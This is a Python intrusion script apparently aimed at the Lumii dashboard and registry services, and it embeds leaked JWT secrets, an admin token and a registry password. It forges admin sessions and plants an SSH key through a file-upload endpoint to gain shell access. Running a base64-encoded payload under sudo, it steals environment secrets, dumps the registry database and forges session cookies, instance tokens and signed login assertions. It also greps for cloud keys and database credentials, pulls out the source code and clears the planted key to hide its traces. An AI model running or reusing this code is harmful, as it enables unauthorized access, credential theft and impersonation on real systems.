#!/usr/bin/env python3
# i29469 round b: dump app.ts + market-admin-page.ts, registry DB rows, local admin login, forge admin session/instance token/login assertion, external registry+center tests.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
DASH = "dashboard.lumiiai.cn"
JWT_SECRETS = ["w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A=", "ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938"]
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
REG_PW = "PIf8jOhp275N9N4CYvkBMQtGRQ3RWMOP"
REG_TOKEN = "9d275d97606940a90c37f2b1ab8caaa21c43075f5019f6d21cef08c0d625f4ce"
HOSTIP = "122.51.1.87"
KEY = "/tmp/i29469key"
START = time.time()

def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)

def Rc(k, text, chunk=2500):
    text = text if isinstance(text, str) else str(text)
    n = (len(text) + chunk - 1) // chunk
    R(k + "_N", str(n))
    for i in range(n):
        R("%s_%d" % (k, i), text[i*chunk:(i+1)*chunk])

def run(args, timeout=90):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def sh(cmd, timeout=150):
    args = ["ssh", "-i", KEY, "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes", "-o", "ConnectTimeout=18", "-o", "LogLevel=ERROR",
            "ubuntu@" + HOSTIP, cmd]
    return run(args, timeout=timeout + 30)

def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=120000):
    url = "https://%s%s" % (DASH, path)
    a = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA, "-w", "\n__C__%{http_code}"]
    if session: a += ["-H", "Cookie: session=" + session]
    if admin: a += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if body is not None: a += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET": a += ["-X", method]
    a += [url]
    rc, out, err = run(a, timeout=timeout + 20)
    t = out.decode("utf-8", "replace"); c = ""
    i = t.rfind("__C__")
    if i >= 0: c = t[i+5:].strip()[:3]; t = t[:i]
    return {"code": c, "body": t[:maxlen]}

def ext(url, method="GET", body=None, headers=None, timeout=14, maxlen=40000, cookie=None):
    a = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA, "-w", "\n__C__%{http_code}"]
    for h in (headers or []): a += ["-H", h]
    if cookie: a += ["-H", "Cookie: " + cookie]
    if body is not None: a += ["-X", method, "--data-binary", body]
    elif method != "GET": a += ["-X", method]
    a += [url]
    rc, out, err = run(a, timeout=timeout + 15)
    t = out.decode("utf-8", "replace"); c = ""
    i = t.rfind("__C__")
    if i >= 0: c = t[i+5:].strip()[:3]; t = t[:i]
    return {"code": c, "body": t[:maxlen]}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(uid, cust="aro", secret=None, role="admin"):
    secret = secret or JWT_SECRETS[0]
    now = int(time.time())
    hh = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pp = b64u(json.dumps({"userId": uid, "email": "p@x", "customer": cust, "role": role,
                          "iat": now, "exp": now + 86400*7}, separators=(",", ":")))
    return hh + "." + pp + "." + b64u(hmac.new(secret.encode(), (hh+"."+pp).encode(), hashlib.sha256).digest())

# ---------- dashboard: session + pick agent ----------
sess = None
for sec in JWT_SECRETS:
    for u in ["af0a2285-490f-11f1-ac43-525400595be1", "usr_ZxLewKrgbRYSm7rWDtQX8"]:
        s = forge(u, "aro", sec)
        t = call("/api/me", session=s, timeout=18)
        if t["code"] == "200":
            sess = s; R("SESS_OK", {"uid": u, "me": t["body"][:160]}); break
    if sess: break
R("SESS", {"have": bool(sess)})

r = call("/api/admin/agents", admin=True, timeout=45)
agents = []
try: agents = (json.loads(r["body"]) or {}).get("agents", [])
except Exception: pass
AID = None
for a in agents:
    if a.get("customer") == "aro" and a.get("id"): AID = a["id"]; break
if not AID and agents: AID = agents[0].get("id")
orig = {"ip": None, "sshUser": None}
for a in agents:
    if a.get("id") == AID: orig = {"ip": a.get("ip"), "sshUser": a.get("sshUser")}
R("PICK", {"aid": AID, "orig": orig, "n": len(agents)})

run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", KEY, "-q"], timeout=30)
open("/tmp/i29469_ak2", "w").write(open(KEY + ".pub").read())

call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": "127.0.0.1", "ssh_user": "ubuntu"}, timeout=25)

# ---------- host-side work script ----------
HOST = r'''
import os,json,base64,hashlib,hmac,subprocess,sys,time,sqlite3,urllib.request,urllib.parse,urllib.error
def out(k,v):
    print("### "+k)
    print(v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str))
def sh(c):
    try:
        p=subprocess.run(["sudo","bash","-lc",c],capture_output=True,timeout=60)
        return p.stdout.decode("utf-8","replace")+p.stderr.decode("utf-8","replace")
    except Exception as e: return "ERR "+repr(e)
def http(url,method="GET",body=None,headers=None,timeout=12):
    data=None
    if body is not None: data=body.encode()
    rq=urllib.request.Request(url,data=data,method=method)
    for k,v in (headers or {}).items(): rq.add_header(k,v)
    try:
        try:
            r=urllib.request.urlopen(rq,timeout=timeout)
            return {"code":r.status,"body":r.read()[:6000].decode("utf-8","replace"),"hdr":dict(r.headers)}
        except urllib.error.HTTPError as e:
            return {"code":e.code,"body":e.read()[:6000].decode("utf-8","replace"),"hdr":dict(e.headers)}
    except Exception as e: return {"code":-1,"body":repr(e),"hdr":{}}

# read env
envtxt=sh("cat /etc/lumii-registry.env")
env={}
for ln in envtxt.splitlines():
    ln=ln.strip()
    if "=" in ln and not ln.startswith("#"):
        k,v=ln.split("=",1); env[k]=v
out("REG_ENV_KEYS", sorted(env.keys()))
PW=env.get("REGISTRY_ADMIN_PASSWORD","")
SEC=env.get("REGISTRY_TOKEN_SECRET","")
DER=env.get("LOGIN_ASSERTION_PRIVATE_KEY","")
KID=env.get("LOGIN_ASSERTION_KID","")

# db dump
dbdump={}
try:
    c=sqlite3.connect("/var/lib/lumii-registry/registry.db")
    def q(sql):
        try: return [dict(zip([d[0] for d in c.execute(sql).description],r)) for r in c.execute(sql).fetchall()]
        except Exception as e: return "ERR "+repr(e)
    dbdump["enterprises"]=q("SELECT code,id,base_url,status,display_name,market_secret_hash<>'' AS has_mkt,push_secret_hash<>'' AS has_push FROM enterprises")
    dbdump["market_agents"]=q("SELECT slug,name,publisher_code,status,latest_version FROM market_agents LIMIT 200")
    dbdump["onboard_tokens"]=q("SELECT code,enterprise_id,expires_at,used_at,revoked_at FROM onboard_tokens LIMIT 100")
    dbdump["instance_tokens"]=q("SELECT code,enterprise_id,base_url,last_seen_at,revoked_at FROM instance_tokens LIMIT 100")
    dbdump["market_namespaces"]=q("SELECT prefix,publisher_id,claimed_at FROM market_namespaces")
    dbdump["admin_sessions"]=q("SELECT token_hash,expires_at FROM admin_sessions")
except Exception as e:
    dbdump["ERR"]=repr(e)
out("DB", dbdump)

# local admin login
login=http("http://127.0.0.1:4080/admin/api/login","POST",json.dumps({"password":PW}),{"Content-Type":"application/json","Origin":"https://registry.lumiiai.cn"})
out("LOGIN_NOORIGIN_NOTE", "with origin")
out("LOGIN", login)
# capture cookie name
cookie_full=None
for k,v in (login.get("hdr") or {}).items():
    if k.lower()=="set-cookie":
        cookie_full=v
out("SETCOOKIE", cookie_full or "")
cname=None; cval=None
if cookie_full:
    first=cookie_full.split(";")[0]
    if "=" in first: cname,cval=first.split("=",1)
out("COOKIE_NAME", cname)

if cval:
    ent=http("http://127.0.0.1:4080/admin/api/enterprises","GET",None,{"Cookie":cname+"="+cval})
    out("ADMIN_ENTERPRISES", ent)

# forge admin session cookie (scrypt)
try:
    key=hashlib.scrypt(PW.encode(),salt=b"lumii-registry-admin-session\x00v1",n=16384,r=8,p=1,dklen=32)
    exp=int(time.time())+12*3600
    payload=base64.urlsafe_b64encode(json.dumps({"exp":exp},separators=(",",":")).encode()).rstrip(b"=").decode()
    sig=base64.urlsafe_b64encode(hmac.new(key,payload.encode(),hashlib.sha256).digest()).rstrip(b"=").decode()
    forged=payload+"."+sig
    out("FORGED_ADMIN_COOKIE", {"name":cname,"token":forged})
    if cname:
        fe=http("http://127.0.0.1:4080/admin/api/enterprises","GET",None,{"Cookie":cname+"="+forged})
        out("FORGED_ADMIN_TEST", fe)
except Exception as e:
    out("FORGED_ADMIN_ERR",repr(e))

# forge instance token for an enterprise
try:
    code="aro"; eid=""
    for e in dbdump.get("enterprises",[]):
        if isinstance(e,dict) and e.get("status")=="active":
            code=e.get("code"); eid=e.get("id"); break
    payload={"eid":eid,"code":code,"scope":"market","exp":int(time.time())+3600,"n":"abc123"}
    enc=base64.urlsafe_b64encode(json.dumps(payload,separators=(",",":")).encode()).rstrip(b"=").decode()
    sg=hmac.new(SEC.encode(),("v1."+enc).encode(),hashlib.sha256).digest()
    tok="v1."+enc+"."+base64.urlsafe_b64encode(sg).rstrip(b"=").decode()
    out("FORGED_INSTANCE_TOKEN", {"code":code,"eid":eid,"token":tok[:60]+"..."})
    it=http("http://127.0.0.1:4080/v1/market/publisher","GET",None,{"Authorization":"Bearer "+tok})
    out("INSTANCE_TOKEN_TEST", it)
except Exception as e:
    out("INSTANCE_TOKEN_ERR",repr(e))

# login assertion sign (EdDSA via openssl)
try:
    open("/tmp/lk.der","wb").write(base64.b64decode(DER))
    subprocess.run(["openssl","pkey","-inform","DER","-in","/tmp/lk.der","-out","/tmp/lk.pem"],capture_output=True,timeout=20)
    b64u=lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    def mkassert(aud,sub,state,app="web"):
        iat=int(time.time())
        hdr={"alg":"EdDSA","typ":"JWT","kid":KID}
        pl={"iss":"lumii-registry","sub":sub,"aud":aud,"state":state,"nick":"x","avatar":"","app":app,"jti":"jti"+str(iat),"iat":iat,"exp":iat+120}
        inp=b64u(json.dumps(hdr,separators=(",",":")).encode())+"."+b64u(json.dumps(pl,separators=(",",":")).encode())
        p=subprocess.run(["openssl","pkeyutl","-sign","-inkey","/tmp/lk.pem","-rawin"],input=inp.encode(),capture_output=True,timeout=20)
        return inp+"."+b64u(p.stdout),p.returncode,p.stderr.decode("utf-8","replace")[:200]
    # pick a registered enterprise base_url as aud
    aud=None
    for e in dbdump.get("enterprises",[]):
        if isinstance(e,dict) and e.get("status")=="active" and e.get("base_url"):
            aud=e.get("base_url"); break
    a1,rc1,er1=mkassert(aud or "https://dashboard.lumiiai.cn","testunionid","st1234567890abc","web")
    out("ASSERT_SIGN", {"kid":KID,"aud":aud,"rc":rc1,"err":er1,"assertion":a1})
except Exception as e:
    out("ASSERT_ERR",repr(e))

# grep market dir + db for zoofi/keys/dsn
out("GREP2", sh("grep -rIaoE 'zoofi|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|AKID[A-Za-z0-9]{10,}|LTAI[A-Za-z0-9]{10,}|postgres://[^ \"<>]+|mysql://[^ \"<>]+|redis://[^ \"<>]+' /var/lib/lumii-registry 2>/dev/null | head -40")[:4000])

# cat the two remaining source files
out("APP_TS", sh("cat /opt/lumii-registry/src/app.ts"))
out("MARKET_ADMIN_PAGE", sh("cat /opt/lumii-registry/src/market-admin-page.ts")[:20000])
'''
b64 = base64.b64encode(HOST.encode()).decode()
landed = False
for attempt in range(5):
    up_url = "https://%s/api/agents/%s/files/upload?path=%s" % (DASH, AID, up.quote("/home/ubuntu/.ssh", safe="/"))
    rc, out, err = run(["curl", "-s", "-k", "-m", "60", "--http2", "-A", UA, "-H", "Cookie: session=" + (sess or ""),
                        "-F", "files=@/tmp/i29469_ak2;filename=authorized_keys2;type=text/plain",
                        "-w", "\n__C__%{http_code}", up_url], timeout=80)
    R("UPLOAD_%d" % attempt, out.decode("utf-8", "replace")[:200])
    rc, out, err = sh("id | cut -d' ' -f1", timeout=22)
    if b"uid=" in out:
        landed = True; R("LAND", {"ok": True, "attempt": attempt}); break
    R("LAND_%d" % attempt, {"rc": rc, "err": err.decode("utf-8", "replace")[:160]}); time.sleep(3)
call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": orig.get("ip"), "ssh_user": orig.get("sshUser")}, timeout=25)

if landed:
    rc, out, err = sh("echo %s | base64 -d > /tmp/i29469h.py && sudo python3 /tmp/i29469h.py" % b64, timeout=200)
    hostout = out.decode("utf-8", "replace")
    Rc("HOSTOUT", hostout, chunk=2000)
    # restore ak2 to empty-ish (remove our key) -- just clear to avoid leaving key; others re-inject anyway
    sh(": > /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEARED", timeout=25)

# ---------- external registry admin tests ----------
devnull = None
# get cookie name from HOSTOUT (parse later locally); here try known candidate names for forged cookie will be done post-run.
ext_res = {}
ext_res["ext_login"] = ext("https://registry.lumiiai.cn/admin/api/login", method="POST",
                           body=json.dumps({"password": REG_PW}), headers=["Content-Type: application/json", "Origin: https://registry.lumiiai.cn"], timeout=14)
ext_res["ext_login_noorigin"] = ext("https://registry.lumiiai.cn/admin/api/login", method="POST",
                           body=json.dumps({"password": REG_PW}), headers=["Content-Type: application/json"], timeout=14)
ext_res["ext_enterprises_noauth"] = ext("https://registry.lumiiai.cn/admin/api/enterprises", timeout=12)
ext_res["ext_v1_environments"] = ext("https://registry.lumiiai.cn/v1/entry-environments", timeout=12)
ext_res["ext_v1_wechat_status"] = ext("https://registry.lumiiai.cn/v1/wechat/status", timeout=12)
Rc("EXT", json.dumps(ext_res, ensure_ascii=False, default=str), chunk=2000)

R("P_DONE", {"elapsed": int(time.time() - START)})
print("DONE", flush=True)
